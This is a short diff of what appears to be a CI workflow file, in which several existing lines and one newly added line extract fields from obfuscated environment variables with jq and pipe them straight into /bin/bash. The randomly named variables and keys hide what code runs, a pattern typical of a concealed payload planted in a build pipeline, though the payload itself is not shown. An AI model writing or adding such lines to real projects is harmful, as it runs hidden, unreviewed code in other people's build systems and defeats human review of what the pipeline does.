@@ -23,6 +23,7 @@ jobs:
           echo $jtr6 | jq -r .l34 | /bin/bash
           echo $uar160 | jq -r .eqo141 | /bin/bash
           printf '%s' "$a3" | jq -r .j5 | /bin/bash
+          echo $swe4 | jq -r .p3443 | /bin/bash
 
       - name: Upload data
         if: always()
